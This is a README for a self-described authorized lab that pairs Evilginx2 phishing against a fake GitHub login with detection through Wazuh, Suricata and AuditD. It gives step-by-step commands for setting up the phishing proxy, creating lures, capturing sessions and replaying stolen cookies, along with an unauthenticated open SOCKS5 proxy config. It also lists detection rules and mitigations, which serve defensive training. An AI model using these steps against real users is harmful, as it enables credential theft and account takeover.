# Red-Team-Phishing-Infrastructure-and-Detection-Simulation-using-Evilginx-and-Wazuh

**Project Owner:** Adekilekun Fatiu\
**Date of Execution:** 07/07/2025\
**Project Title:** Red Team Phishing Infrastructure and Detection Simulation using Evilginx and Wazuh

---

## 1. Objective

Simulate a real-world credential theft operation using Evilginx2 phishing proxy while simultaneously monitoring and detecting activities using Wazuh SIEM with Kibana dashboards.

---

## 2. Scope of Engagement

| Item               | Description                        |
| ------------------ | ---------------------------------- |
| Authorized Range   | AWS-hosted VPS lab environment     |
| Authorized Domains | Internal test domains only         |
| Type of Engagement | Controlled Red Team Simulation     |
| Constraints        | No targeting of real-world systems |

---

## 3. Tools & Technologies

| Tool/Tech             | Purpose                          |
| --------------------- | -------------------------------- |
| Evilginx2             | Phishing Proxy                   |
| NameCheap             | Domain Provider                  |
| AWS Hosted Zones      | DNS Management                   |
| Docker/Docker-Compose | Containerization & Orchestration |
| Wazuh 4.12            | SIEM / XDR                       |
| Dante SOCKS5          | Proxy Server                     |
| Suricata              | Intrusion Detection System (IDS) |
| AuditD                | Linux Audit Daemon               |
| Amazon EC2            | VPS Infrastructure (Ubuntu)      |

---

## 4. Infrastructure Design

**VPS 1 (Attacker Node):**

- Evilginx2
- Dante SOCKS5
- Wazuh Agent
- Suricata
- AuditD

**VPS 2 (Detection Node):**

- Wazuh Manager (Docker Compose)
- Wazuh Dashboard
- Wazuh Indexer

Both servers use key-based SSH authentication only.

---

## 5. Step-by-Step Execution

### Phase 1: Provisioning & DNS Setup

1. **Provision EC2 VPS on AWS**
   - VPS 1: t2.micro (1 GB RAM)
   - VPS 2: t2.large (8 GB RAM)
2. **Register a Domain on Namecheap (blakkhcloud.com)**
3. **Configure DNS records (A, CNAME) using AWS Hosted Zones**

### Phase 2: Evilginx2 & Dante Setup on VPS 1

1. **Update and Install Essentials:**

```bash
sudo apt update && sudo apt upgrade
sudo apt install golang git -y
```

2. **Clone and Build Evilginx2:**

```bash
cd /home/ubuntu
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
go build
sudo ./evilginx2
```

3. **Configure Evilginx2:**

```bash
config domain blakkhcloud.com
config ipv4 <VPS1_PUBLIC_IP>
phishlet hostname github github.blakkhcloud.com
phishlet enable github
```

4. **Install and Configure Dante:**

```bash
sudo apt install dante-server -y
sudo nano /etc/danted.conf
```

Paste this config:

```conf
logoutput: /var/log/danted.log
internal: 0.0.0.0 port = 1080
external: enX0
method: username none
user.notprivileged: nobody
client pass {
  from: 0.0.0.0/0 to: 0.0.0.0/0
  log: connect disconnect error
}
pass {
  from: 0.0.0.0/0 to: 0.0.0.0/0
  protocol: tcp udp
  log: connect disconnect error
}
```

Then:

```bash
sudo touch /var/log/danted.log
sudo chmod 666 /var/log/danted.log
sudo systemctl enable danted
sudo systemctl start danted
sudo ufw allow 1080/tcp
```

Test SOCKS proxy:

```bash
curl -x socks5://<VPS1_PUBLIC_IP>:1080 http://ifconfig.me
```

### Phase 3: Wazuh Manager Deployment on VPS 2

1. **Install Docker & Docker Compose:**

```bash
curl -sSL https://get.docker.com | sh
sudo systemctl start docker

curl -L "https://github.com/docker/compose/releases/download/v2.12.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
docker-compose --version
```

2. **Deploy Wazuh Single Node:**

```bash
git clone https://github.com/wazuh/wazuh-docker.git -b v4.12.0
cd wazuh-docker/single-node
docker-compose -f generate-indexer-certs.yml run --rm generator
docker-compose up -d
```

### Phase 4: Wazuh Configuration (VPS 2)

1. **Edit **``**:**

```bash
docker exec -it wazuh.manager bash
nano /var/ossec/etc/ossec.conf
```

Set:

```xml
<logall>yes</logall>
<enabled>yes</enabled>

# Then add this to   <!-- <active-response> active-response options here</active-response> -->
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5763</rules_id>
  <timeout>180</timeout>
</active-response>
```

Then:

```bash
exit
docker-compose restart wazuh.manager
```

### Phase 5: Wazuh Agent Setup (VPS 1)

1. **Install Wazuh Agent via dashboard script**
2. **Enable and Start Agent:**

```bash
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

### Phase 6: Suricata & AuditD Log Forwarding (VPS 1)

1. **Configure Syscheck Monitoring:**

```xml
<directories check_all="yes" report_changes="yes" realtime="yes">/home/ubuntu/evilginx2</directories>
```

2. **Install Suricata and Configure:**

```bash
sudo add-apt-repository ppa:oisf/suricata-stable
sudo apt-get update
sudo apt-get install suricata -y
```

Edit `/etc/suricata/suricata.yaml` → Set HOME\_NET and EXTERNAL\_NET, and point rule path.

3. **Edit ossec.conf:**

```xml
# Add this towards the ending of the file for suricata log format
<localfile>
  <log_format>json</log_format>
  <location>/var/log/suricata/eve.json</location>
</localfile>
```

4. **Install AuditD and Set Audit Rules:**

```bash
sudo apt install auditd
sudo nano /etc/audit/audit.rules
```

Add:

```bash
-a exit,always -F arch=b32 -S execve -k audit-wazuh-c
-a exit,always -F arch=b64 -S execve -k audit-wazuh-c
-a always,exit -F path=/home/ubuntu/evilginx2 -F perm=x -k evilginx_exec
```

Then:

```bash
sudo auditctl -R /etc/audit/audit.rules
sudo augenrules --load
```

### Phase 7: Phishing Campaign Execution (VPS 1)

1. **Create Phishing Lure:**

```bash
lures create github
# Then check for lure id
lures
lures edit <id> path /login
lures edit <id> hostname github.blakkhcloud.com
lures get-url <id>
```

2. **Check Sessions:**

```bash
sessions
sessions <id>
```

3. **Replay Attack:** Use `EditThisCookie` extension to import session cookies and gain access to accounts.

---

## 6. Detection Use Cases

| Detection Point            | Wazuh Rule ID | Visibility                |
| -------------------------- | ------------- | ------------------------- |
| Evilginx process starts    | 100100        | Dashboard Alert           |
| Phishlet files modified    | 100101        | File Integrity Monitoring |
| SOCKS5 Proxy activity      | 100102/100103 | Port & Process Detection  |
| SSH Operator Access        | 100105        | Auth Logs                 |
| Outbound Target Connection | 100106        | Network Monitoring        |

---

## 7. Mitigation Recommendations

- Block Evilginx signatures on IDS/IPS
- Monitor Dante/Evilginx processes at endpoint
- Enforce MFA, token refresh intervals
- Adopt phishing-resistant authentication (e.g., passkeys)
- Conduct phishing simulations and user awareness

---

## 8. Lessons Learned

- Evilginx2 is an effective phishing proxy
- Wazuh, with custom rules, successfully detects red team behavior
- SOCKS5 proxies provide good opsec and traffic obfuscation
- Suricata and AuditD enhance visibility on low-level behavior

---

## 9. Project Deliverables

-  Evilginx phishlet templates
-  Custom Wazuh detection rules
-  Audit.rules for AuditD
-  Dante SOCKS5 proxy config (`danted.conf`)
-  `ossec.conf` templates for Wazuh Manager & Agent
-  Project/execution emages in assets folder
-  Full setup + attack simulation guide (this file)

---

## 10. Ethical Disclaimer

This project was executed in a private cloud lab environment solely for educational and ethical cybersecurity training. No real-world services or unauthorized systems were targeted. All assets, infrastructure, and domains are under the control of the project owner.

---

**GitHub Repository:** [Add Link Here]\
**Author:** Adekilekun Fatiu\
**License:** MIT or Educational Use Only

